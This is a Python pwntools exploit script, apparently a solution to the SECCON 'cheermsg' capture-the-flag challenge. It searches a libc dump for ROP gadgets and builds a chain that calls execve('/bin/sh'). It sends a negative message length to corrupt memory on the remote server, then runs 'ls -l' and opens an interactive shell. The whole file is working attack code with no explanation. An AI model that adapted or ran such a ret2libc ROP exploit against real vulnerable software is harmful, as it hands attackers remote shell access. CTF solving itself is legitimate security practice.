from pwn import *
import re
import struct



#conn = conn = remote('127.0.0.1' ,1337)
    # for gdb debug
#addr_libc = int(raw_input(),16)
addr_libc = 0xf755f000

dump = open('libc-2.19.so-c4dc1270c1449536ab2efbbe7053231f1a776368').read()
#dump = open('/lib/i386-linux-gnu/libc-2.23.so').read()

offset_binsh = dump.index('/bin/sh\x00')
offset_pop_eax = dump.index('\x58\xc3')
offset_pop_ebx = dump.index('\x5b\xc3')
offset_pop_ecx_edx = dump.index('\x59\x5a\xc3')
offset_int80 = dump.index('\xcd\x80')
print "[+] offset_binsh = %x" % offset_binsh
print "[+] offset_pop_eax = %x" % offset_pop_eax
print "[+] offset_pop_ebx = %x" % offset_pop_ebx
print "[+] offset_pop_ecx_edx = %x" % offset_pop_ecx_edx
print "[+] offset_int80 = %x" % offset_int80

p = p32(addr_libc + offset_pop_eax) + p32(11)
p += p32(addr_libc + offset_pop_ebx) + p32(addr_libc + offset_binsh)
p += p32(addr_libc + offset_pop_ecx_edx) + p32(0) + p32(0)
p += p32(addr_libc + offset_int80)

print p.encode('hex')

while 1:

    #conn = remote('127.0.0.1' ,1337)
    conn = remote("cheermsg.pwn.seccon.jp", 30527)

    line = conn.recvuntil('Message Length >>')
    conn.send("-150\n")

    line = conn.recvuntil('Name >>')
    conn.send(p+'\n')

    conn.send('ls -l\n')
    try:

        line = conn.recvline()
        print line
        line = conn.recvline()
        print line
        line = conn.recvline()
        print line
        time.sleep(1)
        line = conn.recvline()
        print line
        time.sleep(1)
        conn.interactive()
    except EOFError:
        print "error\n"
        conn.close()
